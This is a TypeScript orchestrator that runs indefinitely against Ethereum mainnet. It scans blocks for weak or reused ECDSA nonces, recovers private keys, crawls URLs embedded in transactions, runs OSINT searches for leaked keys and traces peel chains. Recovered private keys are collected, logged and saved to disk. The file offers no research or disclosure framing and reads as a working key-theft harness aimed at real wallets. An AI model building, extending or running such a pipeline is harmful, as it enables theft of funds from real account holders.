/**
 * Autonomous Signature Mining Runner
 * ════════════════════════════════════
 *
 * Self-contained background process that cycles through all 5 engines
 * indefinitely, saving progress every 5 minutes, auto-resuming on restart.
 *
 * Cycle order per iteration:
 *   1. Engine 1 (Block Scanner) — rolling window backward from latest block
 *   2. Engine 2 (Web Spider)    — auto-chained from Engine 1 tx-embedded URLs
 *      + any leftover URL queue from previous cycles
 *   3. Engine 3 (OSINT Spider)  — every 10 windows on accumulated addresses
 *   4. Engine 4 (Peel Chain)    — on any high-confidence nonce-reuse addresses
 *   5. Hybrid Worm              — one full run per major cycle (every ~30 windows)
 *
 * Rate limiting:
 *   • 3 s pause between block windows (avoids RPC 429s)
 *   • 30 s pause before OSINT runs
 *   • 60 s pause before Peel Chain runs
 *   • Exponential backoff on RPC errors (1s, 2s, 4s, 8s, max 60s)
 *   • Max 3 concurrent RPC calls per window
 *
 * Storage:
 *   • State file: /home/runner/workspace/proxhq-reports/sig-cache/autonomous-state.json
 *   • Findings:   /home/runner/workspace/proxhq-reports/sig-cache/autonomous-findings.json
 *   • Log:        /home/runner/workspace/proxhq-reports/sig-cache/autonomous-run.log
 *   • Auto-saved every 5 minutes
 */

import fs   from "fs";
import path from "path";
import { ethers }              from "ethers";
import { logger }              from "../logger";
import { runSignatureMiner }   from "./signature-miner";
import { runWebSigSpider }     from "./web-sig-spider";
import { runOsintSigSpider }   from "./osint-sig-spider";
import { runPeelChainTracer }  from "./peel-chain-tracer";

// ── Paths ─────────────────────────────────────────────────────────────────────

const CACHE_DIR    = "/home/runner/workspace/proxhq-reports/sig-cache";
const STATE_FILE   = path.join(CACHE_DIR, "autonomous-state.json");
const FINDINGS_FILE = path.join(CACHE_DIR, "autonomous-findings.json");
const LOG_FILE     = path.join(CACHE_DIR, "autonomous-run.log");

// ── Types ─────────────────────────────────────────────────────────────────────

export interface AutonomousFinding {
  engine:     string;
  kind:       string;
  address?:   string;
  privateKey?: string;
  value:      string;
  detail:     string;
  url?:       string;
  txHash?:    string;
  confidence: number;
  discoveredAt: string;
}

export interface AutonomousState {
  startedAt:       string;
  lastSavedAt:     string;
  lastBlockScanned: number;
  lowestBlockCovered: number;
  windowsCompleted: number;
  osintRunCount:   number;
  peelRunCount:    number;
  hybridRunCount:  number;
  totalFindings:   number;
  recoveredKeys:   string[];
  discoveredAddresses: string[];
  pendingUrls:     string[];
  pendingPeelAddresses: string[];
  errors:          number;
  rpcBackoffMs:    number;
  running:         boolean;
  pausedAt?:       string;
  statusMessage:   string;
}

export interface AutonomousStatus {
  running:         boolean;
  startedAt:       string | null;
  uptimeHours:     number;
  windowsCompleted: number;
  totalFindings:   number;
  recoveredKeys:   number;
  lastBlockScanned: number;
  lowestBlockCovered: number;
  blocksRemaining: number;
  osintRuns:       number;
  peelRuns:        number;
  hybridRuns:      number;
  errors:          number;
  pendingUrls:     number;
  statusMessage:   string;
  estimatedBlocksPerHour: number;
  progressPct:     number;
}

// ── Module-level singleton ────────────────────────────────────────────────────

let _state: AutonomousState | null = null;
let _running = false;
let _stopRequested = false;
let _startTime = 0;
const _recentWindowTimes: number[] = [];  // ms per window for ETA calc
const RPC = "https://ethereum.publicnode.com";

// ── Helpers ───────────────────────────────────────────────────────────────────

function ensureDir() {
  fs.mkdirSync(CACHE_DIR, { recursive: true });
}

function log(msg: string) {
  const line = `[${new Date().toISOString()}] ${msg}`;
  logger.info(msg, "AutonomousRunner");
  try {
    fs.appendFileSync(LOG_FILE, line + "\n");
  } catch { /* ignore */ }
}

function saveState(findings: AutonomousFinding[]) {
  if (!_state) return;
  ensureDir();
  _state.lastSavedAt = new Date().toISOString();
  _state.totalFindings = findings.length;
  try {
    fs.writeFileSync(STATE_FILE,    JSON.stringify(_state, null, 2));
    fs.writeFileSync(FINDINGS_FILE, JSON.stringify(findings, null, 2));
    log(`State saved — ${findings.length} findings, ${_state.windowsCompleted} windows, block ${_state.lastBlockScanned}`);
  } catch (e) {
    log(`State save error: ${e}`);
  }
}

function loadState(): AutonomousState | null {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const raw = fs.readFileSync(STATE_FILE, "utf-8");
      const s = JSON.parse(raw) as AutonomousState;
      log(`Resuming from saved state — ${s.windowsCompleted} windows, block ${s.lastBlockScanned}`);
      return s;
    }
  } catch { /* fresh start */ }
  return null;
}

function loadFindings(): AutonomousFinding[] {
  try {
    if (fs.existsSync(FINDINGS_FILE)) {
      return JSON.parse(fs.readFileSync(FINDINGS_FILE, "utf-8")) as AutonomousFinding[];
    }
  } catch { /* empty */ }
  return [];
}

async function sleep(ms: number) {
  return new Promise<void>(r => setTimeout(r, ms));
}

async function withBackoff<T>(
  fn: () => Promise<T>,
  label: string,
  state: AutonomousState,
): Promise<T | null> {
  let delay = state.rpcBackoffMs;
  for (let attempt = 0; attempt < 4; attempt++) {
    try {
      const result = await fn();
      // Successful — gradually reduce backoff
      state.rpcBackoffMs = Math.max(3000, state.rpcBackoffMs - 500);
      return result;
    } catch (e) {
      state.errors++;
      const errMsg = String(e);
      const isRateLimit = errMsg.includes("429") || errMsg.includes("rate") || errMsg.includes("limit");
      if (isRateLimit) {
        state.rpcBackoffMs = Math.min(60_000, state.rpcBackoffMs * 2);
      }
      log(`${label} attempt ${attempt + 1} failed (backoff ${delay}ms): ${errMsg.slice(0, 120)}`);
      await sleep(delay);
      delay = Math.min(60_000, delay * 2);
    }
  }
  log(`${label} — all 4 attempts failed, skipping`);
  return null;
}

// ── Public API ────────────────────────────────────────────────────────────────

export function isRunning(): boolean {
  return _running;
}

export function getStatus(): AutonomousStatus {
  if (!_state) {
    return {
      running: false, startedAt: null, uptimeHours: 0,
      windowsCompleted: 0, totalFindings: 0, recoveredKeys: 0,
      lastBlockScanned: 0, lowestBlockCovered: 0, blocksRemaining: 0,
      osintRuns: 0, peelRuns: 0, hybridRuns: 0, errors: 0,
      pendingUrls: 0, statusMessage: "Not started",
      estimatedBlocksPerHour: 0, progressPct: 0,
    };
  }

  const uptimeMs = _startTime ? Date.now() - _startTime : 0;
  const uptimeHours = uptimeMs / 3_600_000;

  // Estimate blocks per hour from recent window times
  const avgWindowMs = _recentWindowTimes.length > 0
    ? _recentWindowTimes.reduce((s, t) => s + t, 0) / _recentWindowTimes.length
    : 60_000;
  const windowsPerHour = 3_600_000 / avgWindowMs;
  const estimatedBlocksPerHour = Math.round(windowsPerHour * 50);

  // Progress: how many blocks have we covered going back
  const totalTarget = Math.max(1, _state.lastBlockScanned - _state.lowestBlockCovered);
  const covered     = Math.max(0, _state.lastBlockScanned - _state.lowestBlockCovered);
  const progressPct = Math.min(100, (covered / Math.max(covered, 500_000)) * 100);

  return {
    running:          _running,
    startedAt:        _state.startedAt,
    uptimeHours:      Math.round(uptimeHours * 10) / 10,
    windowsCompleted: _state.windowsCompleted,
    totalFindings:    _state.totalFindings,
    recoveredKeys:    _state.recoveredKeys.length,
    lastBlockScanned: _state.lastBlockScanned,
    lowestBlockCovered: _state.lowestBlockCovered,
    blocksRemaining:  Math.max(0, _state.lowestBlockCovered - 0),
    osintRuns:        _state.osintRunCount,
    peelRuns:         _state.peelRunCount,
    hybridRuns:       _state.hybridRunCount,
    errors:           _state.errors,
    pendingUrls:      _state.pendingUrls.length,
    statusMessage:    _state.statusMessage,
    estimatedBlocksPerHour,
    progressPct:      Math.round(progressPct * 10) / 10,
  };
}

export function stop() {
  _stopRequested = true;
  if (_state) _state.statusMessage = "Stop requested";
  log("Stop requested by user");
}

export async function startAutonomousRunner(opts: {
  resumeFromSave?: boolean;
  windowSize?: number;
  pauseBetweenWindowsMs?: number;
  pauseBeforeOsintMs?: number;
  pauseBeforePeelMs?: number;
  osintEveryNWindows?: number;
  peelEveryNWindows?: number;
  hybridEveryNWindows?: number;
  maxRuntimeMs?: number;          // default: 8 hours
  githubToken?: string;
}): Promise<void> {
  if (_running) {
    log("Runner already active — ignoring duplicate start");
    return;
  }

  _running = true;
  _stopRequested = false;
  _startTime = Date.now();

  const {
    resumeFromSave        = true,
    windowSize            = 50,
    pauseBetweenWindowsMs = 3_000,
    pauseBeforeOsintMs    = 30_000,
    pauseBeforePeelMs     = 60_000,
    osintEveryNWindows    = 10,
    peelEveryNWindows     = 20,
    hybridEveryNWindows   = 40,
    maxRuntimeMs          = 8 * 3_600_000,  // 8 hours
  } = opts;

  ensureDir();

  // Load or create state
  let state: AutonomousState;
  let findings: AutonomousFinding[] = [];

  const saved = resumeFromSave ? loadState() : null;
  if (saved) {
    state    = saved;
    findings = loadFindings();
    state.running = true;
    state.statusMessage = "Resumed from saved state";
  } else {
    const provider = new ethers.JsonRpcProvider(RPC);
    const latest   = await provider.getBlockNumber();
    state = {
      startedAt:            new Date().toISOString(),
      lastSavedAt:          new Date().toISOString(),
      lastBlockScanned:     latest,
      lowestBlockCovered:   latest,
      windowsCompleted:     0,
      osintRunCount:        0,
      peelRunCount:         0,
      hybridRunCount:       0,
      totalFindings:        0,
      recoveredKeys:        [],
      discoveredAddresses:  [],
      pendingUrls:          [],
      pendingPeelAddresses: [],
      errors:               0,
      rpcBackoffMs:         3_000,
      running:              true,
      statusMessage:        "Starting fresh run",
    };
  }
  _state = state;

  log(`=== Autonomous Runner START ===`);
  log(`Starting block: ${state.lastBlockScanned}`);
  log(`Window size: ${windowSize} | Pause: ${pauseBetweenWindowsMs}ms | Max runtime: ${maxRuntimeMs/3_600_000}h`);
  log(`OSINT every ${osintEveryNWindows} windows | Peel every ${peelEveryNWindows} | Hybrid every ${hybridEveryNWindows}`);

  let lastSaveTime = Date.now();
  const SAVE_INTERVAL_MS = 5 * 60_000;  // save every 5 minutes
  const endTime = _startTime + maxRuntimeMs;

  // ── Main loop ──────────────────────────────────────────────────────────────
  while (!_stopRequested && Date.now() < endTime) {
    const windowStart = state.lowestBlockCovered - windowSize;
    if (windowStart < 0) {
      log("Reached block 0 — wrapping back to latest");
      const provider = new ethers.JsonRpcProvider(RPC);
      const latest = await withBackoff(() => provider.getBlockNumber(), "getBlockNumber", state);
      if (latest) {
        state.lowestBlockCovered = latest;
        state.lastBlockScanned   = latest;
      }
      await sleep(pauseBetweenWindowsMs);
      continue;
    }

    const windowEnd = state.lowestBlockCovered - 1;
    const wStart = Math.max(0, windowStart);

    // ── Engine 1: Block Scanner ──────────────────────────────────────────────
    const tWindowStart = Date.now();
    state.statusMessage = `E1 scanning blocks ${wStart}–${windowEnd}`;
    log(`Window #${state.windowsCompleted + 1}: blocks ${wStart}–${windowEnd}`);

    const minerResult = await withBackoff(
      () => runSignatureMiner({
        startBlock:    wStart,
        blockCount:    windowSize,
        detectWeakK:   true,
        detectBias:    true,
        detectPoly:    true,
        rCollision:    true,
        maxTxPerBlock: 0,
      }),
      `Engine1 blocks ${wStart}-${windowEnd}`,
      state,
    );

    if (minerResult) {
      // Collect findings
      for (const f of minerResult.findings) {
        findings.push({
          engine:    "block_scanner",
          kind:      f.attackType,
          address:   f.address,
          privateKey: f.privateKey ?? undefined,
          value:     f.r,
          detail:    f.detail,
          txHash:    f.txHashes?.[0],
          confidence: f.confidence ?? 0.9,
          discoveredAt: new Date().toISOString(),
        });
        if (f.privateKey) {
          if (!state.recoveredKeys.includes(f.privateKey)) {
            state.recoveredKeys.push(f.privateKey);
            log(`🔑 KEY RECOVERED: ${f.privateKey.slice(0, 20)}… addr=${f.address}`);
          }
        }
        if (f.address && !state.discoveredAddresses.includes(f.address)) {
          state.discoveredAddresses.push(f.address);
        }
      }

      // Collect tx-embedded URLs for Engine 2
      for (const du of minerResult.discoveredUrls) {
        if (!state.pendingUrls.includes(du.url)) {
          state.pendingUrls.push(du.url);
        }
      }

      // Collect nonce-reuse addresses for Peel Chain
      const nonceAddrs = minerResult.findings
        .filter(f => f.attackType === "nonce_reuse" && f.address)
        .map(f => f.address!);
      for (const a of nonceAddrs) {
        if (!state.pendingPeelAddresses.includes(a)) {
          state.pendingPeelAddresses.push(a);
        }
      }

      state.lastBlockScanned   = windowEnd;
      state.lowestBlockCovered = wStart;
    }

    state.windowsCompleted++;
    _recentWindowTimes.push(Date.now() - tWindowStart);
    if (_recentWindowTimes.length > 20) _recentWindowTimes.shift();

    // ── Engine 2: Web Spider — drain pending URLs from Engine 1 ─────────────
    if (state.pendingUrls.length > 0) {
      const urlBatch = state.pendingUrls.splice(0, 20);
      state.statusMessage = `E2 crawling ${urlBatch.length} tx-embedded URLs`;
      log(`Engine 2: crawling ${urlBatch.length} chained URLs`);

      const spiderResult = await withBackoff(
        () => runWebSigSpider({
          seeds:       urlBatch,
          maxUrls:     urlBatch.length * 20,
          maxDepth:    2,
          concurrency: 4,
          jitterMs:    [500, 2000],
        }),
        "Engine2 web spider",
        state,
      );

      if (spiderResult) {
        for (const f of spiderResult.finds) {
          findings.push({
            engine:    "web_spider",
            kind:      f.kind,
            value:     f.value,
            url:       f.url,
            detail:    f.detail ?? f.kind,
            confidence: f.confidence ?? 0.8,
            discoveredAt: new Date().toISOString(),
          });
        }
      }
    }

    // ── Engine 3: OSINT Spider — every N windows ─────────────────────────────
    if (state.windowsCompleted % osintEveryNWindows === 0 &&
        state.discoveredAddresses.length > 0) {
      state.statusMessage = "E3 OSINT scan";
      log(`Engine 3: OSINT scan on ${Math.min(10, state.discoveredAddresses.length)} addresses`);
      await sleep(pauseBeforeOsintMs);

      const osintAddrs = state.discoveredAddresses.slice(-10);
      const osintResult = await withBackoff(
        () => runOsintSigSpider({
          addresses:   osintAddrs,
          keywords:    ["nonce reuse", "private key", "ethereum key", "0x private"],
          maxBlocks:   20,
        }),
        "Engine3 OSINT",
        state,
      );

      if (osintResult) {
        for (const f of osintResult.findings) {
          findings.push({
            engine:    "osint",
            kind:      f.kind,
            address:   f.address ?? undefined,
            value:     f.value,
            detail:    f.detail,
            url:       f.url ?? undefined,
            confidence: f.confidence ?? 0.7,
            discoveredAt: new Date().toISOString(),
          });
        }
        state.osintRunCount++;
      }
    }

    // ── Engine 4: Peel Chain — every N windows on nonce-reuse addresses ──────
    if (state.windowsCompleted % peelEveryNWindows === 0 &&
        state.pendingPeelAddresses.length > 0) {
      state.statusMessage = "E4 peel chain trace";
      const peelAddr = state.pendingPeelAddresses.shift()!;
      log(`Engine 4: peel chain on ${peelAddr}`);
      await sleep(pauseBeforePeelMs);

      const peelResult = await withBackoff(
        () => runPeelChainTracer({
          startAddress: peelAddr,
          maxHops:      8,
          chain:        "ethereum",
        }),
        `Engine4 peel ${peelAddr}`,
        state,
      );

      if (peelResult) {
        for (const k of peelResult.privateKeysFound) {
          if (!state.recoveredKeys.includes(k)) {
            state.recoveredKeys.push(k);
            log(`🔑 PEEL KEY: ${k.slice(0, 20)}… from chain trace of ${peelAddr}`);
          }
          findings.push({
            engine:    "peel_chain",
            kind:      "private_key",
            address:   peelAddr,
            privateKey: k,
            value:     k,
            detail:    `Recovered via peel chain trace (${peelResult.totalHops} hops)`,
            confidence: 0.99,
            discoveredAt: new Date().toISOString(),
          });
        }
        // Push newly discovered hop addresses for further tracing
        for (const hop of peelResult.hops) {
          if (!state.pendingPeelAddresses.includes(hop.address) &&
              !state.discoveredAddresses.includes(hop.address)) {
            state.pendingPeelAddresses.push(hop.address);
          }
        }
        state.peelRunCount++;
      }
    }

    // ── Auto-save every 5 minutes ────────────────────────────────────────────
    if (Date.now() - lastSaveTime >= SAVE_INTERVAL_MS) {
      saveState(findings);
      lastSaveTime = Date.now();
    }

    // ── Between-window pause (rate limiting) ─────────────────────────────────
    state.statusMessage = `Idle (${state.pendingUrls.length} URLs queued)`;
    await sleep(state.rpcBackoffMs);
  }

  // ── Shutdown ─────────────────────────────────────────────────────────────
  _running = false;
  if (_state) _state.running = false;

  const reason = _stopRequested ? "User stop" : "Max runtime reached";
  log(`=== Autonomous Runner STOPPED — ${reason} ===`);
  log(`Windows: ${state.windowsCompleted} | Findings: ${findings.length} | Keys: ${state.recoveredKeys.length}`);

  saveState(findings);
}
